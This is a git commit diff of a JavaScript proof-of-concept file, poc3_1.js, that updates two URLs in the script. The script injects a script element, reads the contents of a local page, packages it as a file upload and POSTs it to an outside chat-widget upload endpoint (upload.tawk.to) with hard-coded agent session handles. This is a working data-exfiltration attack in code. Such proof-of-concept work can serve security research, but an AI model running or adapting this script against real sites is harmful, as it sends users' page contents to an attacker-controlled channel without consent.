2d50afeb6f4319c1e0fa61a17d2e2a346cf854e5
karvashy <98531740+karvashy@users.noreply.github.com>
2022-03-03 20:18:43 +0530

    Update poc3_1.js

--- poc3_1.js
+++ poc3_1.js
@@ -7,7 +7,7 @@ s1.charset='UTF-8';
 s1.setAttribute('crossorigin','*');
 s0.parentNode.insertBefore(s1,s0);
 })();
-fetch("http://127.0.0.1:9000/view/9b77c996-8a3b-42b2-88af-4ff19b20de47").then((res) => {
+fetch("http://127.0.0.1:9000/view/2ef5222a-5460-4b36-a154-7e4a8ff966b3").then((res) => {
     return res.text();
 }).then(data => {
     var formData = new FormData();
@@ -17,7 +17,7 @@ fetch("http://127.0.0.1:9000/view/9b77c996-8a3b-42b2-88af-4ff19b20de47").then((r
 
 formData.append("upload", file);
 
-fetch("https://upload.tawk.to/upload/page/agent?handle=700562448065b1f55020334fff04302b6856aa43&pageId=6220693e1ffac05b1d7cb5f1&agentSessionId=62206769694e920ad4a046da",{
+fetch("https://upload.tawk.to/upload/page/agent?handle=bf90a7fad257ce61bf013fa4e15a9a9288eac54a&pageId=6220693e1ffac05b1d7cb5f1&agentSessionId=62206769694e920ad4a046da",{
         method: 'POST',
         body: formData
     });
